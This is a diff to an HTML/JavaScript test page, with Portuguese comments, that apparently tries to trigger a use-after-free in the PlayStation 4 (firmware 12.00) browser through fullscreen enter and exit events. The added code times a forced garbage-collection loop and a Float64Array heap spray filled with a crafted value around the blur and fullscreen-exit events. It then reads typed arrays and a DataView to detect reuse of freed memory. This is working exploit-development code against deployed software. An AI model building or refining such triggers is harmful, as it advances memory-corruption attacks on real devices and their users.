@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - Stable Trigger Test</title>
+<title>PS4 Fullscreen UAF - Post Exit Real</title>
 </head>
 <body>
 
-<h2>PS4 12.00 - Fullscreen UAF (Teste 4 Expandido)</h2>
+<h2>PS4 12.00 - UAF (Post-Exit Real)</h2>
 
 <button onclick="run()">Run Test</button>
 
@@ -20,11 +20,17 @@ function log(msg) {
 let f64, u32, dv;
 let victimBuffer;
 
+let blurTriggered = false;
+let exitDetected = false;
+
 function run() {
     log("[*] Iniciando teste...");
 
+    blurTriggered = false;
+    exitDetected = false;
+
     // =========================
-    // Criar objetos críticos
+    // Criar objetos alvo
     // =========================
     victimBuffer = new ArrayBuffer(0x100);
     f64 = new Float64Array(victimBuffer);
@@ -38,64 +44,109 @@ function run() {
     log("[+] Objetos criados");
 
     // =========================
-    // Fullscreen
+    // ENTER FULLSCREEN
     // =========================
     document.documentElement.webkitRequestFullscreen?.();
+    log("[*] Entrou em fullscreen — pressione OPTIONS");
 
     // =========================
-    // Eventos críticos
+    // EVENTOS
     // =========================
+    document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement && blurTriggered && !exitDetected) {
+            exitDetected = true;
+
+            log("[EVENT] FULLSCREEN EXIT REAL detectado");
+
+            // 🔥 PÓS-EXIT REAL (janela crítica)
+            setTimeout(postExitCheck, 100);
+        }
+    });
+
     document.addEventListener("visibilitychange", () => {
         log("[EVENT] visibilitychange: " + document.visibilityState);
     });
 
-    document.addEventListener("fullscreenchange", () => {
-        log("[EVENT] fullscreenchange fired");
-
-        // 🔥 PONTO CRÍTICO
-        setTimeout(() => {
-            log("[*] Forçando saída fullscreen...");
-            document.webkitExitFullscreen?.();
-        }, 50);
-    });
-
     window.onblur = function() {
-        log("[EVENT] onblur recebido");
+        if (blurTriggered) return;
+        blurTriggered = true;
 
-        // =========================
-        // GC leve
-        // =========================
-        for (let i = 0; i < 5000; i++) {
-            new ArrayBuffer(0x1000);
-        }
+        log("[EVENT] onblur recebido (OPTIONS)");
 
-        log("[*] GC leve executado");
+        // Delay CRÍTICO
+        setTimeout(() => {
 
-        // =========================
-        // Heap spray leve
-        // =========================
-        let spray = [];
-        for (let i = 0; i < 2000; i++) {
-            let arr = new Float64Array(16);
-            arr.fill(2.121995791e-314);
-            spray.push(arr);
-        }
+            log("[*] Janela crítica aberta (~500ms)");
 
-        log("[*] Spray leve executado");
+            // =========================
+            // GC CONTROLADO
+            // =========================
+            for (let i = 0; i < 10000; i++) {
+                new ArrayBuffer(0x2000);
+            }
 
-        // =========================
-        // CHECK PRÉ-CRASH
-        // =========================
-        try {
-            log("---- CHECK PRÉ-EXIT ----");
-            log("[F64] " + f64[0]);
-            log("[U32] " + u32[2]);
-            log("[DV] " + dv.getUint32(16, true));
-            log("[META] len=" + f64.length + " byteLength=" + f64.byteLength);
-        } catch (e) {
-            log("[ERRO CHECK] " + e);
-        }
+            log("[*] GC executado");
+
+            // =========================
+            // SPRAY CONTROLADO
+            // =========================
+            let spray = [];
+            for (let i = 0; i < 4000; i++) {
+                let arr = new Float64Array(16);
+                arr.fill(2.121995791e-314);
+                spray.push(arr);
+            }
+
+            log("[*] Spray executado");
+
+            // =========================
+            // CHECK PRÉ-EXIT
+            // =========================
+            try {
+                log("---- CHECK PRÉ-EXIT ----");
+                log("[F64] " + f64[0]);
+                log("[U32] " + u32[2]);
+                log("[DV] " + dv.getUint32(16, true));
+                log("[META] len=" + f64.length + " byteLength=" + f64.byteLength);
+            } catch (e) {
+                log("[ERRO PRÉ] " + e);
+            }
+
+        }, 500); // ← ESSENCIAL
     };
+}
+
+// =========================
+// CHECK PÓS-EXIT (CRÍTICO)
+// =========================
+function postExitCheck() {
+    log("==== CHECK PÓS-EXIT ====");
+
+    try {
+        log("[F64] " + f64[0]);
+    } catch (e) {
+        log("[F64 ERROR] " + e);
+    }
+
+    try {
+        log("[U32] " + u32[2]);
+    } catch (e) {
+        log("[U32 ERROR] " + e);
+    }
+
+    try {
+        log("[DV] " + dv.getUint32(16, true));
+    } catch (e) {
+        log("[DV ERROR] " + e);
+    }
+
+    try {
+        log("[META] len=" + f64.length + " byteLength=" + f64.byteLength);
+    } catch (e) {
+        log("[META ERROR] " + e);
+    }
+
+    log("==== FIM ====");
 }
 </script>
 
